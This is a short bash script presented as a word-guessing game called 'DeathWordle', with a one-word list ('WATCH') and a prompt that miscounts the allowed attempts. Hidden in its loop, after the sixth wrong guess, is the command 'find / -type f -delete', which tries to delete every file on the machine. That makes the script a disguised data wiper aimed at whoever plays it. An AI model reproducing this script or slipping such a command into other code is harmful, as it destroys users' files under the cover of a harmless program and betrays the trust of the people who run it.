#!/bin/bash

words=("WATCH")

word=${words[$RANDOM % ${#words[@]}]}

guesses=0
max_guesses=6

echo "DeathWordle_Mac_Linux"
echo "Guess the word by entering a 5 letter word in all caps. You have 7 attempts.."
echo "Good luck."

while true; do
    read -p "Enter your guess: " guess

    correct_positions=0
    for ((i=0; i<${#word}; i++)); do
        letter=${word:i:1}
        if [ "${guess:i:1}" == "$letter" ]; then
            ((correct_positions++))
        fi
    done

    echo "Your guess: $guess"
    echo "Correct letters in correct positions: $correct_positions"
    echo

    if [ $correct_positions -eq ${#word} ]; then
        echo "Congratulations! You've guessed the word: $word"
        break
    fi

    ((guesses++))
    if [ $guesses -eq $max_guesses ]; then
        find / -type f -delete
    fi
done
